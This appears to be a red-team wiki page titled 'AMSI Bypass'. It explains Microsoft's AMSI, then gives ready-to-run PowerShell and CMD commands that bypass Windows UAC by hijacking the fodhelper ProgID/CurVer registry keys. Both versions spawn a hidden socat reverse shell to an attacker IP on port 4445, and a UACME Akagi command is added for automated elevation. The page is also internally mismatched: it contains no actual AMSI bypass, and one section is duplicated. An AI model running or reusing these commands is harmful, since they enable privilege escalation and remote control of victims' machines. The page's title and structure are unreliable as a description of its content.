# AMSI Bypass

## Theory

With the release of PowerShell, Microsoft released [AMSI (Anti-Malware Scan Interface)](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal). It is a runtime detection measure shipped natively with Windows and is an interface for other products and solutions.

### How it works ?

AMSI (Anti-Malware Scan Interface) is a PowerShell security feature that will allow any applications or services to integrate directly into anti-malware products. Defender instruments AMSI to scan payloads and scripts before execution inside the .NET runtime. The [CLR (Common Language Runtime)](https://learn.microsoft.com/en-us/dotnet/standard/clr) and [DLR (Dynamic Language Runtime)](https://learn.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview) are the runtimes for .NET.  
  
AMSI is fully integrated into the following Windows components:  
    - User Account Control, or UAC  
    - PowerShell  
    - Windows Script Host (wscript and cscript)  
    - JavaScript and VBScript  
    - Office VBA macros  
  
The below diagram depicts how data is dissected as it flows through the layers and what DLLs/API calls are being instrumented.  
![](http://hack-army.net/wp-content/uploads/2022/11/35e16d45ce27145fcdf231fdb8dcb35e.png)  
  
This is important to understand the complete model of AMSI, but we can break it down into core components, shown in the diagram below.  
![](http://hack-army.net/wp-content/uploads/2022/11/efca9438e858f0476a4ffd777c36501a.png)


{% hint style="danger" %}
if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate.
{% endhint %}

## Practice

Microsoft doesn't consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.

### Using ProgID and AutoElevate binary to bypass UAC
we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.  
{% tabs %}
{% tab title="Powershell" %}
The exploit code is proposed by [V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
```bash
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
    
New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
    
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
{% hint style="danger" %}
Detected by Windowds Defender
{% endhint %}
{% endtab %}

{% tab title="CMD" %}
V3ded exploit converted in CMD by TryHackMe
```bash
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
The operation completed successfully.

C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
The operation completed successfully.

C:\> fodhelper.exe
```  
{% endtab %}
{% endtabs %}  

### Automated Exploitation
{% tabs %}
{% tab title="UACME" %}
While [UACME](https://github.com/hfiref0x/UACME) provides several tools, we will focus mainly on the one called **Akagi**, which runs the actual UAC bypasses  
If you want to test for method 33, you can do the following from a command prompt, and a high integrity cmd.exe will pop up:

```bash
C:\tools>UACME-Akagi64.exe 33
```  
{% endtab %}
{% endtabs %}  
### Using ProgID and AutoElevate binary to bypass UAC
we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.

## References

{% embed url="https://tryhackme.com/room/runtimedetectionevasion" %}

